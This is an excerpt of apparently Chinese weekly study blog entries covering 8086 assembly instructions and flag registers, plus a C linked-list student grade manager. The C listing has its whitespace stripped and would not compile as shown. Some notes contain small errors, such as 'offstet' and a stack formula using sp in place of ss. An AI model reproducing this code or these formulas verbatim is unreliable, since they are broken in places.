(dx)=[(dx)*10000h+(ax)]/((ds)*16+(bx)+(si)+8)的余数</p>
<h3 id="dd-指令">dd 指令</h3>
<ul>
<li>用 db 定义字节型数据</li>
<li>用 dw 定义字型数据</li>
<li>用 dd 定义 double（双字）型数据</li>
</ul>
<h3 id="dup">dup</h3>
<p>dup 是一个操作符，和 db、dw、dd 等数据定义伪指令配合使用，用来进行数据的重复<br>
db/dw/dd 重复次数 dup（重复的数据）</p>
<p>如：<br>
~db200dup（0）<br>
：定义了 200 个字节的 0<br>
db3dup（‘abc’）<br>
：定义了 9 个字节:‘abcabcabc’</p>
<h3 id="转移指令">转移指令</h3>
<p>指可以修改 ip 或同时修改 cs 和 ip 的指令</p>
<p>段内转移：只修改 ip<br>
~短转移：-128~127<br>
近转移：-32768~32767</p>
<h2 id="3-c-语言-学生成绩管理系统">3.c 语言-学生成绩管理系统</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstu&#123;</span><br><span class="line">	intnum;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	intsex;</span><br><span class="line">	intage;</span><br><span class="line">	intscore;</span><br><span class="line">	structstu*next;</span><br><span class="line">&#125;;</span><br><span class="line">structstu*p;</span><br><span class="line">voidmenu()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;choseafunction:\n&quot;</span></span><br><span class="line">	<span class="string">&quot;1.录入信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;2.打印信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;3.保存信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;4.读取信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;5.统计所有人数\n&quot;</span></span><br><span class="line">	<span class="string">&quot;6.按学号查找信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;7.修改信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;8.删除信息\n&quot;</span></span><br><span class="line">	<span class="string">&quot;9.退出\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">voidremove();</span><br><span class="line">voidbuild();</span><br><span class="line">voidprint(structstu*p);</span><br><span class="line">voidsum(structstu*p);</span><br><span class="line">voidsave(structstu*p);</span><br><span class="line">voidfind(structstu*p);</span><br><span class="line">voidmodify(structstu*p);</span><br><span class="line">voidread();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n)&#123;</span><br><span class="line">			case9:</span><br><span class="line">				return0;</span><br><span class="line">			case1:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case2:<span class="comment">//打印</span></span><br><span class="line">				print(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case3:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case4:<span class="comment">//读取</span></span><br><span class="line">				read();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case5:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case6:<span class="comment">//查找</span></span><br><span class="line">				find(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case7:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case8:<span class="comment">//删除</span></span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Wrongnum\n&quot;</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidbuild()&#123;</span><br><span class="line">	structstu*head=<span class="literal">NULL</span>,*nextp;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;顺序输入学号姓名性别（男1女0）年龄成绩输入-1结束\n&quot;</span>);</span><br><span class="line">	nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;num!=<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d%d&quot;</span>,nextp-&gt;name,&amp;nextp-&gt;sex,&amp;nextp-&gt;age,&amp;nextp-&gt;score);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidprint(structstu*p)&#123;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidsum(structstu*p)&#123;</span><br><span class="line">	inti=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidfind(structstu*p)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入学号：&quot;</span>);</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;num==num)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WrongNumber\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidmodify(structstu*p)&#123;</span><br><span class="line">	structstu*head;</span><br><span class="line">	head=p;</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入修改学生的学号:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(head)&#123;</span><br><span class="line">		<span class="keyword">if</span>(head-&gt;num!=num)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;学号错误&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入修改学生的信息:\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;顺序输入姓名性别（男1女0）年龄成绩输入:\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d%d&quot;</span>,head-&gt;name,&amp;head-&gt;sex,&amp;head-&gt;age,&amp;head-&gt;score);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功修改\n&quot;</span>);</span><br><span class="line">		print(p);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidremove()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入删除的学生学号：&quot;</span>);</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	structstu*head,*nextp,*d;</span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	d=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;num==n)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head)&#123;</span><br><span class="line">			<span class="keyword">if</span>(n!=head-&gt;num)&#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;学号错误&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidsave(structstu*p)&#123;</span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\stuinfo.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d%s%d%d%d\n&quot;</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;数据保存成功。\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidread()&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		structstu*nextp=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\stuinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件无法打开&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		structstu*nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;num)==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;sex);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;age);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;score);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.10-2020.02.16</title>
    <url>/34199.html</url>
    <content><![CDATA[<h1>汇编学习</h1>
<h2 id="offset">offset</h2>
<p>功能是取得标号的偏移地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    start:mov ax,offset start</span><br><span class="line">    &lt;!-- 相当于mov ax,0 --&gt;</span><br><span class="line">    s:mov ax,offstet s</span><br><span class="line">    &lt;!-- 相当于mov ax,3 --&gt;</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>offset取得了标号start和s的偏移地址：0和3</p>
<span id="more"></span>
<h2 id="jmp">jmp</h2>
<h3 id="依据位移进行转移的jmp指令">依据位移进行转移的jmp指令</h3>
<h4 id="1-jmp-short-标号">1.jmp short 标号</h4>
<p>实现段内短转移，对ip修改范围为：-128~127字节<br>
例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">start:mov ax,0</span><br><span class="line">      jmp short s</span><br><span class="line">      add ax,1</span><br><span class="line">    s:inc ax</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行后ax=1</p>
<p>“依据位移进行转移”:指令对应的机器码中不包含转移的目的地址，而是转移的位移，位移由编译器根据汇编指令计算</p>
<p>jmp short 标号 == （ip）+=8位位移</p>
<ul>
<li>8位位移=标号处的地址 - jmp指令后第一个字节的地址</li>
<li>short 指明位移为8位</li>
<li>8位位移在编译时算出，在机器码中用补码表示</li>
</ul>
<h4 id="2-jmp-near-ptr-标号">2.jmp near ptr 标号</h4>
<p>与jump short 标号 相似<br>
功能为：ip+16位位移</p>
<h3 id="转移的目的地址在指令中的jmp指令">转移的目的地址在指令中的jmp指令</h3>
<h4 id="1-jmp-far-ptr-标号">1.jmp far ptr 标号</h4>
<p>用标号的段地址和偏移地址修改cs和ip<br>
实现的是段间转移（远转移）<br>
功能为：<br>
 (cs)=标号所在段地址 <br>
（ip）=标号所在偏移地址<br>
<strong>机器码：EA0B01BD0B</strong><br>
<strong>对应：jmp 0BBD:0B01</strong></p>
<h3 id="转移地址在寄存器中的jmp指令">转移地址在寄存器中的jmp指令</h3>
<h4 id="1-jmp-16位寄存器">1.jmp 16位寄存器</h4>
<p>（ip）=（16位寄存器）</p>
<h3 id="转移地址在内存中的jmp指令">转移地址在内存中的jmp指令</h3>
<h4 id="1-jmp-word-ptr-内存单元地址（段内转移）">1.jmp word ptr 内存单元地址（段内转移）</h4>
<p>内存单元地址处开始存放的一个字作为偏移地址<br>
内存单元地址可用寻址方式的任一格式给出</p>
<h4 id="2-jmp-dword-ptr-内存单元地址（段间转移）">2.jmp dword ptr 内存单元地址（段间转移）</h4>
<p>高地址处的字是转移到目的地段地址，低地址处是转移到目的偏移地址：<br>
 （cs）=（内存单元地址+2）<br>
 （ip）=（内存单元地址)</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0123</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure>
<p>(cs)=0,(ip)=0123</p>
<h2 id="jcxz">jcxz</h2>
<p>为有条件转移指令</p>
<p><em>所有有条件的转移指令都是短转移，在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em></p>
<p>格式：jcxz 标号<br>
相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((cx)==0)</span><br><span class="line">    jmp short 标号</span><br></pre></td></tr></table></figure>
<h2 id="loop">loop</h2>
<p><em>所有循环指令都是短转移在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em><br>
格式：loop 标号<br>
相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0)</span><br><span class="line">    jmp short 标号;</span><br></pre></td></tr></table></figure>
<h2 id="根据位移进行转移的意义">根据位移进行转移的意义</h2>
<p>在机器码中包含的是位移而不是目的地址—这种设计方便了程序段在内存中的浮动装配，在不同位置都可正确执行</p>
<h2 id="call和ret指令">call和ret指令</h2>
<p>call和ret都是转移指令，修改ip或同时修改cs和ip</p>
<h3 id="ret和retf">ret和retf</h3>
<p>ret用栈中的数据修改ip实现近转移，相当于:<br>
pop ip<br>
retf用栈中的数据修改cs和ip实现远转移，相当于:<br>
 pop ip<br>
 pop cs<br>
 </p>
<h3 id="call">call</h3>
<p>CPU执行call时：<br>
1.将ip或cs和ip压入栈<br>
2.实现长转移<br>
<strong>call不能实现短转移</strong></p>
<h3 id="1-依据位移进行转移的call指令">1.依据位移进行转移的call指令</h3>
<p>call 标号<br>
执行时进行如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((sp)*16+(sp))=(ip)</span><br><span class="line">(ip)=(ip)+16位位移</span><br></pre></td></tr></table></figure>
<p>将当前ip压栈后，转到标号处<br>
相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure>
<h3 id="2-转移的目的地址在指令中的call指令">2.转移的目的地址在指令中的call指令</h3>
<p>call far ptr 标号<br>
执行时进行如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(cs)</span><br><span class="line">(sp)=(sp)-2</span><br><span class="line">((sp)*16+(sp))=(ip)</span><br></pre></td></tr></table></figure>
<p>相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>
<h3 id="3-转移地址在寄存器中的call指令">3.转移地址在寄存器中的call指令</h3>
<p>call 16位寄存器<br>
相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure>
<h3 id="4-转移地址在内存中的call指令">4.转移地址在内存中的call指令</h3>
<h4 id="4-1-call-word-ptr-内存单元地址">4.1.call word ptr 内存单元地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h4 id="4-2-call-dword-ptr-内存单元地址">4.2.call dword ptr 内存单元地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h3 id="call-和-ret配合使用">call 和 ret配合使用</h3>
<p>实现子程序，用call指令执行子程序，再用ret指令转到call指令后的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标号：</span><br><span class="line">    ....</span><br><span class="line">    指令</span><br><span class="line">    ....</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<h2 id="mul指令">mul指令</h2>
<p>乘法指令</p>
<p>注意：</p>
<ul>
<li>两个相乘的数要么都是8位，要么都是16位<br>
 1.如果是8位，一个默认放在al中，另一个放在8位寄存器或内存字节单元中。结果默认放在ax中<br>
 2.如果是16位，一个默认在ax中，另一个放在16位寄存器或内存字单元中。结果高位默认放在dx中，低位2放在ax中</li>
</ul>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mul 寄存器/内存单元</span><br></pre></td></tr></table></figure>
<p>如：<br>
1.100*10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure>
<p>结果：(ax)=1000</p>
<p>2.100*10000</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure>
<p>结果：(ax)=4240h (dx)=000fh<br>
(f4240h=1000000)</p>
<h2 id="一个公式">一个公式</h2>
<p> 将可能产生溢出的除法运算转变为多个不会产生溢出的除法运算(商小于65536)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/n=int (h/n)*65536+[ rem(h/n)*65536+l]/n  </span><br></pre></td></tr></table></figure>
<p>x : 被除数(0,ffffffff)<br>
n : 除数(0,ffff)<br>
h : x高16位<br>
l : x低16位<br>
int() : 取商<br>
rem() : 取余</p>
<h2 id="标志寄存器">标志寄存器</h2>
<p>标志寄存器作用：<br>
1.用来储存相关指令的执行结果<br>
2.用来为CPU执行相关指令提供行为依据<br>
3.用来控制CPU的相关工作方式<br>
8086CPU有16位，其中储存的信息被称为程序状态字（psw）<br>
<strong>flag是按位起作用的，每一位都有专门的含义，记录特定的信息</strong></p>
<p><img src="https://s2.ax1x.com/2020/02/12/1bafdf.png" alt="flag寄存器各位示意图 "></p>
<p>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，其他位都有特殊含义</p>
<p>影响标志寄存器的大都是运算指令，没有影响的大都是传送指令</p>
<h3 id="ZF标志">ZF标志</h3>
<p>零标志位<br>
记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>
<p>执行后zf=1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>
<p>执行后zf=0</p>
<h3 id="PF标志">PF标志</h3>
<p>奇偶标志位<br>
记录相关指令执行后结果的所有bit位中 1 的个数是否为偶数，如果为偶数PF=1，如果不为偶数PF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,1(10)</span><br><span class="line">add al,10(10)</span><br></pre></td></tr></table></figure>
<p>结果为00001011B，∴PF=0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">or al,2</span><br></pre></td></tr></table></figure>
<p>结果为00000011B，∴PF=1</p>
<h3 id="SF标志">SF标志</h3>
<p>符号标志位<br>
记录相关指令执行后结果是否为负，如果负sf=1，如果非负sf=0</p>
<p>计算机中通常用补码表示有符号数据，一个数据可以看作是 有符号数，也可以看成无符号数。<strong>不管如何看待，CPU在执行指令的时候就已经包含了两种含义，也将得到两种结果，关键在于程序需要哪种结果</strong><br>
sf标志是对于有符号数运算的一种记录，记录了数据的正负<br>
将数据<strong>当作有符号数运算时，可以通过 sf 知道结果的正负</strong><br>
将数据<strong>当作无符号数运算时， sf 值无意义，虽然相关指令影响了它的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,1</span><br></pre></td></tr></table></figure>
<p>结果为10000010，sf=1，表示：如果指令进行的是有符号数的运算，那么结果为负。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,10000001B</span><br><span class="line">add al,01111111B</span><br></pre></td></tr></table></figure>
<p>结果为0，sf=0，表示如果指令进行的是有符号数运算，那么结果为非负。</p>
<p><strong>单纯地考查sf的值不能知道结果的正负，因为sf记录的只是可以在计算机中存放的相应位数的结果的正负(如果发生溢出)</strong></p>
<h3 id="CF标志">CF标志</h3>
<p>进位标志位<br>
进行<strong>无符号数</strong>运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p>
<p>对于位数为N的无符号数来说，N-1位为它的<em>最高有效位</em>，假想存在的第N位就是相对于最高有效位的更高位</p>
<p>当两个数据相加的时候，可能产生从最高有效位向更高位的进位。CPU不丢弃这个高位进位值，而是保存在CF上</p>
<h3 id="OF标志">OF标志</h3>
<p>溢出标志位<br>
在进行<strong>有符号数</strong>运算时，如果结果超过了机器能表达的范围称为溢出<br>
记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
<p><strong>CF是对无符号数运算有意义的标志位，OF是对有符号数运算有意义的标志位。</strong><br>
<strong>对于无符号数运算，CPU用CF来记录是否产生进位；对于有符号数，CPU用OF来记录是否产生溢出,还要用SF来记录结果的符号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,98</span><br><span class="line">add al,99</span><br></pre></td></tr></table></figure>
<p>执行后 CF=0，OF=1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,0f0H</span><br><span class="line">add al,78H</span><br></pre></td></tr></table></figure>
<p>执行后CF=1，OF=0</p>
<h3 id="adc指令">adc指令</h3>
<p>带进位加法指令，利用了CF位上记录的进位值<br>
格式：adc 操作对象1，操作对象2<br>
操作对象1=操作对象1+操作对象2+CF<br>
比add指令多加了一个CF位的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add ax,bx</span><br><span class="line">==</span><br><span class="line">add al,bl</span><br><span class="line">adc ah,bh</span><br></pre></td></tr></table></figure>
<p>adc指令执行后也可能产生进位值，所以也会对CF位进行设置<br>
add指令和adc指令配合 可以对更大的数据进行加法运算</p>
<p>例：<br>
计算1EF0001000H+2010001EF0H,结果放在ax，bx，cx中</p>
<p>1.将低16位相加，CF中记录相加的进位值<br>
2.将次高16位和CF相加，CF中记录相加的进位值<br>
3.高16位和CF相加，CF中记录相加的进位值</p>
<h3 id="sbb指令">sbb指令</h3>
<p>带借位减法指令，利用了CF位上的借位值<br>
格式：sbb 操作对象1，操作对象2<br>
功能：操作对象1=操作对象1-操作对象2-CF<br>
可以对任意大的数据进行减法运算，思路同adc指令</p>
<h3 id="cmp指令">cmp指令</h3>
<p>比较指令，功能相当于减法指令，只是不保存结果，仅仅根据计算结果对标志寄存器进行设置<br>
格式：cmp 操作对象1，操作对象2<br>
cmp可以对无符号数进行比较，也可以对有符号数进行比较<br>
通过cmp指令执行后，相关标志位的值可以看出比较的结果：</p>
<p>进行无符号数比较时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure>
<p>如果(ax)=(bx)则(ax)-(bx)=0，所以zf=1<br>
如果(ax)!=(bx)则(ax)-(bx)!=0，所以zf=0<br>
如果(ax)&lt;(bx)则(ax)-(bx)将产生借位，所以cf=1<br>
如果(ax)&gt;=(bx)则(ax)-(bx)将不必借位，所以cf=0<br>
